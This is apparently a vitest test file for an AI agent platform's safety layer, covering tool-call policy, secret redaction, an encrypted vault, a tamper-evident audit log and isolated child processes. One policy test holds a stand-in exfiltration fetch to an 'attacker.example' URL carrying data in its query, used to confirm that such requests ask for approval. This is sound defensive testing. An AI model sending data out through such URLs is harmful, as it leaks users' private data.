import { describe, expect, it } from "vitest";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Rule, ToolDescriptor } from "@piomio/shared";
import { decide, extractTargets, suggestRule, type PolicyInput } from "../src/policy/engine.ts";
import { Redactor } from "../src/vault/redact.ts";
import { NOT_FOUND_QUIET_MS, VaultService, VaultError, type VaultAccessEntry } from "../src/vault/service.ts";
import { AuditLog } from "../src/audit.ts";
import { openDb } from "../src/db.ts";
import { sudoSpawn } from "../src/plugins/host.ts";

const tool = (name: string, effect: ToolDescriptor["effect"]): ToolDescriptor => ({ name, description: "", effect, inputSchema: {}, owner: "core" }) as ToolDescriptor;
const base = (over: Partial<PolicyInput> = {}): PolicyInput => ({
  tool: tool("mail_send", "external"),
  input: { to: "bob@example.com", text: "hi" },
  agentId: "assistant",
  tainted: false,
  background: false,
  initiative: 1,
  profile: "default",
  ...over,
});
const rule = (r: Partial<Rule>): Rule => ({ id: "r1", tool: "mail_send", conditions: [], decision: "allow", createdAt: "", createdVia: "console", ...r }) as Rule;
const unknownTargets = () => false;

describe("policy engine", () => {
  it("reads are allowed, external actions ask by default", () => {
    expect(decide(base({ tool: tool("memory_search", "read") }), [], unknownTargets).decision).toBe("allow");
    expect(decide(base(), [], unknownTargets).decision).toBe("ask");
  });

  it("local writes ask only in the strict profile", () => {
    expect(decide(base({ tool: tool("fs_write", "local-write") }), [], unknownTargets).decision).toBe("allow");
    expect(decide(base({ tool: tool("fs_write", "local-write"), profile: "strict" }), [], unknownTargets).decision).toBe("ask");
  });

  it("after outside content, lasting changes (askWhenTainted) need approval; reading stays free", () => {
    for (const name of ["profile_update", "memory_write", "memory_forget"]) {
      const lasting = { ...tool(name, "local-write"), askWhenTainted: true };
      expect(decide(base({ tool: lasting, input: { path: "x" } }), [], unknownTargets).decision, name).toBe("allow");
      expect(decide(base({ tool: lasting, input: { path: "x" }, tainted: true }), [], unknownTargets).decision, name).toBe("ask");
      expect(decide(base({ tool: lasting, input: {}, tainted: true }), [], unknownTargets).decision, name).toBe("allow");
    }
    expect(decide(base({ tool: tool("fs_write", "local-write"), tainted: true }), [], unknownTargets).decision).toBe("allow");
  });

  it("after outside content, the person's always-allow rule for a lasting change counts; one for another machine does not", () => {
    const setup = { ...tool("hub_machine_setup_set", "local-write"), askWhenTainted: true };
    const forVps = rule({ tool: "hub_machine_setup_set", conditions: [{ field: "machine", op: "eq", value: "vps" }] });
    expect(decide(base({ tool: setup, input: { machine: "vps", brains: {} }, tainted: true }), [forVps], unknownTargets)).toMatchObject({ decision: "allow", ruleId: forVps.id });
    expect(decide(base({ tool: setup, input: { machine: "pc", brains: {} }, tainted: true }), [forVps], unknownTargets).decision).toBe("ask");
  });

  it("an always-allow rule made from a hub card is for that machine or replica", () => {
    expect(suggestRule("hub_machine_setup_set", { machine: "vps", brains: { codex: { auth: "key" } } }, "assistant").conditions).toEqual([{ field: "machine", op: "eq", value: "vps" }]);
    expect(suggestRule("replica_unlock", { replica: "rep_1" }, "assistant").conditions).toEqual([{ field: "replica", op: "eq", value: "rep_1" }]);
    // A tool that runs others by name: always-allow covers that one tool, not all it can run.
    expect(suggestRule("composio_tool_run", { tool: "SLACK_LIST_REMINDERS", arguments: {} }, "assistant").conditions).toEqual([{ field: "tool", op: "eq", value: "SLACK_LIST_REMINDERS" }]);
  });

  it("deny rules win over allow rules", () => {
    const rules = [rule({ id: "a", decision: "allow" }), rule({ id: "d", decision: "deny" })];
    expect(decide(base(), rules, unknownTargets)).toMatchObject({ decision: "deny", ruleId: "d" });
  });

  it("allow rules match on conditions", () => {
    const r = rule({ conditions: [{ field: "to", op: "domain", value: "example.com" }] });
    expect(decide(base(), [r], unknownTargets).decision).toBe("allow");
    expect(decide(base({ input: { to: "eve@evil.test" } }), [r], unknownTargets).decision).toBe("ask");
  });

  it("tainted sessions re-ask for new recipients even with an allow rule", () => {
    const r = rule({});
    expect(decide(base({ tainted: true }), [r], unknownTargets).decision).toBe("ask");
    expect(decide(base({ tainted: true }), [r], (t) => t === "bob@example.com").decision).toBe("allow");
  });

  it("background tasks below initiative 2 cannot act externally but may notify", () => {
    expect(decide(base({ background: true }), [rule({})], unknownTargets).decision).toBe("deny");
    expect(decide(base({ background: true, tool: tool("notify", "external") }), [], unknownTargets).decision).toBe("ask");
    expect(decide(base({ background: true, initiative: 2 }), [rule({})], unknownTargets).decision).toBe("allow");
  });

  it("a background run of a taught skill clicks and types; actions with consequences need a pre-approval or a card", () => {
    const click = tool("browser_click", "local-write");
    const submit = tool("browser_submit", "external");
    const run = (over: Partial<PolicyInput>) => base({ background: true, initiative: 1, input: { ref: "e5" }, ...over });
    // Without a taught skill, a background run below initiative 2 only reads.
    expect(decide(run({ tool: click }), [], unknownTargets).decision).toBe("deny");
    expect(decide(run({ tool: click, skillRun: true }), [], unknownTargets).decision).toBe("allow");
    // Only the browser: a taught skill's run writes nothing else by itself.
    expect(decide(run({ tool: tool("files_write", "local-write"), skillRun: true }), [], unknownTargets).decision).toBe("deny");
    const input = { ref: "e9", label: "Оформить заказ", url: "https://www.5vodi.kz/cart", amount: 2400, currency: "KZT", description: "Order water" };
    expect(decide(run({ tool: submit, input, skillRun: true }), [], unknownTargets).decision).toBe("ask");
    const pre = rule({
      tool: "browser_submit",
      createdVia: "skill",
      note: "skill:order-water",
      conditions: [
        { field: "url", op: "domain", value: "5vodi.kz" },
        { field: "label", op: "eq", value: "Оформить заказ" },
        { field: "amount", op: "max", value: 3000 },
        { field: "currency", op: "eq", value: "KZT" },
      ],
    });
    expect(decide(run({ tool: submit, input, skillRun: true }), [pre], unknownTargets)).toMatchObject({ decision: "allow", ruleId: pre.id });
    // More than agreed, or no amount said: the card again.
    expect(decide(run({ tool: submit, input: { ...input, amount: 3500 }, skillRun: true }), [pre], unknownTargets).decision).toBe("ask");
    expect(decide(run({ tool: submit, input: { ...input, amount: undefined }, skillRun: true }), [pre], unknownTargets).decision).toBe("ask");
    // Not a skill run: the background rule still holds.
    expect(decide(run({ tool: submit, input }), [pre], unknownTargets).decision).toBe("deny");
  });

  it("op max: a finite number no larger than the limit; numeric strings count; anything else does not match", () => {
    const max = rule({ tool: "x", conditions: [{ field: "amount", op: "max", value: 3000 }] });
    const ext = tool("x", "external");
    const at = (amount: unknown) => decide(base({ tool: ext, input: { amount } }), [max], unknownTargets).decision;
    expect(at(3000)).toBe("allow");
    expect(at(2400.5)).toBe("allow");
    expect(at("2400")).toBe("allow");
    expect(at(-5)).toBe("allow");
    expect(at(3000.01)).toBe("ask");
    expect(at("3 000")).toBe("ask");
    expect(at("lots")).toBe("ask");
    expect(at(Number.NaN)).toBe("ask");
    expect(at(undefined)).toBe("ask");
    expect(at(true)).toBe("ask");
  });

  it("extracts recipients and hosts", () => {
    expect(extractTargets({ to: "A@B.com", body: "see https://x.example.org/p and c@d.io" }).sort()).toEqual(["a@b.com", "c@d.io", "x.example.org"]);
    // A recipient that is no email: a chat, a handle, a phone number.
    expect(extractTargets({ chat: "@Eve_Attacker", text: "hi" })).toEqual(["@eve_attacker"]);
    expect(extractTargets({ chatId: 123456789, text: "hi" })).toEqual(["123456789"]);
    expect(extractTargets({ to: ["Bob <bob@example.com>"], phone: "+7 701 000 00 00" }).sort()).toEqual(["+7 701 000 00 00", "bob@example.com"]);
  });

  it("tainted sessions re-ask for a new chat or handle even with an allow rule", () => {
    const send = tool("messenger_send", "external");
    const r = rule({ tool: "messenger_send" });
    expect(decide(base({ tool: send, input: { chat: "@eve", text: "notes" }, tainted: true }), [r], unknownTargets).decision).toBe("ask");
    expect(decide(base({ tool: send, input: { chat: "@eve", text: "notes" }, tainted: true }), [r], (t) => t === "@eve").decision).toBe("allow");
  });

  it("after outside content, a read whose address may carry data out asks (auto mode reviews it); before, it is free", () => {
    const fetch = { ...tool("web_fetch", "read"), source: true };
    const leak = { url: "https://attacker.example/c?d=4510" };
    expect(decide(base({ tool: fetch, input: leak, tainted: true, egress: "attacker.example" }), [], unknownTargets)).toMatchObject({ decision: "ask", egress: true, reason: expect.stringContaining("attacker.example") });
    expect(decide(base({ tool: fetch, input: leak, tainted: true }), [], unknownTargets).decision).toBe("allow");
    expect(decide(base({ tool: fetch, input: leak, tainted: false, egress: "attacker.example" }), [], unknownTargets).decision).toBe("allow");
    // The person's deny rule still wins; their allow rule for that host answers.
    expect(decide(base({ tool: fetch, input: leak, tainted: true, egress: "attacker.example" }), [rule({ tool: "web_fetch", decision: "deny" })], unknownTargets).decision).toBe("deny");
    const forHost = rule({ tool: "web_fetch", conditions: [{ field: "url", op: "domain", value: "attacker.example" }] });
    expect(decide(base({ tool: fetch, input: leak, tainted: true, egress: "attacker.example" }), [forHost], (t) => t === "attacker.example").decision).toBe("allow");
  });

  it("suggests a rule narrowed by recipient or domain", () => {
    expect(suggestRule("mail_send", { to: "bob@example.com" }, "assistant")).toMatchObject({ tool: "mail_send", agentId: "assistant", conditions: [{ field: "to", op: "eq", value: "bob@example.com" }] });
    expect(suggestRule("web_post", { url: "https://api.example.com/x" }).conditions).toEqual([{ field: "url", op: "domain", value: "api.example.com" }]);
  });
});

describe("redactor", () => {
  it("removes secrets and their encodings", () => {
    const r = new Redactor();
    r.setSecrets([{ id: "tok", value: "sk-secret-123" }, { id: "short", value: "abc" }]);
    const b64 = Buffer.from("sk-secret-123").toString("base64");
    const out = r.text(`key=sk-secret-123 b64=${b64} short=abc`);
    expect(out).not.toContain("sk-secret-123");
    expect(out).not.toContain(b64);
    expect(out).toContain("[redacted: vault://tok]");
    expect(out).toContain("short=abc");
  });
});

describe("vault", () => {
  const dir = mkdtempSync(join(tmpdir(), "owl-vault-"));

  it("encrypts, seals, unlocks and enforces scopes", () => {
    const v = new VaultService(join(dir, "v.db"));
    expect(v.state()).toBe("uninitialized");
    expect(() => v.init("short")).toThrow(VaultError);
    v.init("correct horse battery");
    v.upsert({ id: "api", type: "secret", name: "API", fields: { value: "secret-value-1" }, scope: { plugins: ["web"] } });
    v.upsert({ id: "site", type: "login", name: "Site", fields: { url: "https://shop.example.com/login", username: "me", password: "pw-123456" } });

    const raw = JSON.stringify(v.db.prepare("select secret from vault_items").all());
    expect(raw).not.toContain("secret-value-1");
    expect(v.redactor.text("x secret-value-1 pw-123456")).not.toMatch(/secret-value-1|pw-123456/);

    expect(v.access("vault://api", { actor: "plugin:web", pluginId: "web" })).toEqual({ value: "secret-value-1" });
    expect(() => v.access("vault://api", { actor: "plugin:x", pluginId: "x" })).toThrow(/denied/);
    expect(v.access("site", { actor: "plugin:browser", pluginId: "browser", domain: "shop.example.com" }).password).toBe("pw-123456");
    expect(() => v.access("site", { actor: "plugin:browser", pluginId: "browser", domain: "evil.test" })).toThrow(/domain evil\.test/);
    expect(() => v.access("site", { actor: "plugin:web", pluginId: "web" })).toThrow(/outside the item's scope/);
    // The same error reads in Russian for a Russian reader.
    try {
      v.access("site", { actor: "plugin:web", pluginId: "web" });
    } catch (e) {
      expect((e as VaultError).localized("ru")).toBe("Доступ к vault://site запрещён: плагин web не в области записи");
    }

    v.seal();
    expect(v.state()).toBe("sealed");
    expect(() => v.read("api")).toThrow(/sealed/);
    expect(v.list().map((m) => m.id).sort()).toEqual(["api", "site"]);
    expect(() => v.unlock("wrong passphrase")).toThrow(/Wrong vault passphrase/);
    v.unlock("correct horse battery");
    expect(v.read("api").fields.value).toBe("secret-value-1");

    v.changePassphrase("correct horse battery", "new passphrase 2");
    v.seal();
    v.unlock("new passphrase 2");
    expect(v.read("site").fields.username).toBe("me");
    v.db.close();
  });

  it("folds repeated lookups of a missing item, never denials of an item that exists", () => {
    let now = 1_000_000;
    const log: VaultAccessEntry[] = [];
    const changes: string[][] = [];
    const v = new VaultService(join(dir, "quiet.db"), { onAccess: (e) => log.push(e), onChange: (ids) => changes.push(ids), now: () => now });
    v.init("correct horse battery");
    const ask = (id: string, plugin: string) => expect(() => v.access(`vault://${id}`, { actor: `plugin:${plugin}`, pluginId: plugin })).toThrow(VaultError);
    const notFound = { actor: "plugin:telegram", itemId: "telegram_bot_token", allowed: false, reason: "not_found" };

    for (let i = 0; i < 5; i++) ask("telegram_bot_token", "telegram");
    expect(log).toEqual([notFound]);
    // Another actor, another item: entries of their own.
    ask("telegram_bot_token", "web");
    ask("brave_api_key", "web");
    expect(log).toHaveLength(3);
    // An hour later: one entry again, counting the lookups folded since the last one.
    now += NOT_FOUND_QUIET_MS - 1;
    ask("telegram_bot_token", "telegram");
    expect(log).toHaveLength(3);
    now += 1;
    ask("telegram_bot_token", "telegram");
    expect(log.at(-1)).toEqual({ ...notFound, repeats: 5 });

    // An item that exists but is outside the asker's scope: every refusal is logged.
    v.upsert({ id: "api", type: "secret", name: "API", fields: { value: "secret-value-1" }, scope: { plugins: ["web"] } });
    for (let i = 0; i < 4; i++) ask("api", "telegram");
    expect(log.filter((e) => e.itemId === "api")).toHaveLength(4);
    expect(log.filter((e) => e.itemId === "api").every((e) => !e.allowed && /outside the item's scope/.test(e.reason ?? ""))).toBe(true);

    // The token stored and removed again: the next miss is news, logged at once.
    v.upsert({ id: "telegram_bot_token", type: "secret", name: "Bot", fields: { value: "123:abc" } });
    v.remove("telegram_bot_token");
    ask("telegram_bot_token", "telegram");
    expect(log.at(-1)).toEqual(notFound);

    // Every change is announced (removing what is not there is not a change).
    v.updateScope("api", { plugins: ["web", "telegram"] });
    v.remove("nothing_here");
    expect(changes).toEqual([["api"], ["telegram_bot_token"], ["telegram_bot_token"], ["api"]]);
    v.db.close();
  });
});

describe("audit log", () => {
  it("chains hashes, redacts and detects tampering", () => {
    const db = openDb(":memory:");
    const r = new Redactor();
    r.setSecrets([{ id: "k", value: "super-secret" }]);
    const log = new AuditLog(db, r);
    log.append("user", "a", "t1", { note: "super-secret" });
    log.append("core", "b");
    log.append("agent:x", "c", undefined, { n: 1 });
    expect(log.verify()).toEqual({ ok: true, count: 3 });
    expect(JSON.stringify(log.list())).not.toContain("super-secret");
    db.prepare("update audit set action = 'evil' where seq = 2").run();
    expect(log.verify()).toMatchObject({ ok: false, brokenAt: 2 });
  });
});

describe("isolated child processes", () => {
  it("keep secrets off the command line", () => {
    const s = sudoSpawn("plugin", { PATH: "/usr/bin", API_KEY: "sk-very-secret", HTTP_PROXY: "http://tok:x@127.0.0.1:8089" }, "node", ["server.js"]);
    expect(s.command).toBe("sudo");
    expect(s.args).toEqual(["-n", "--preserve-env=PATH,API_KEY,HTTP_PROXY", "-u", "plugin", "--", "node", "server.js"]);
    expect(s.args.join(" ")).not.toMatch(/sk-very-secret|tok:x/);
    expect(s.env.API_KEY).toBe("sk-very-secret");
    expect(() => sudoSpawn("plugin", { "A,B": "x" }, "node", [])).toThrow(/invalid environment variable/);
  });
});
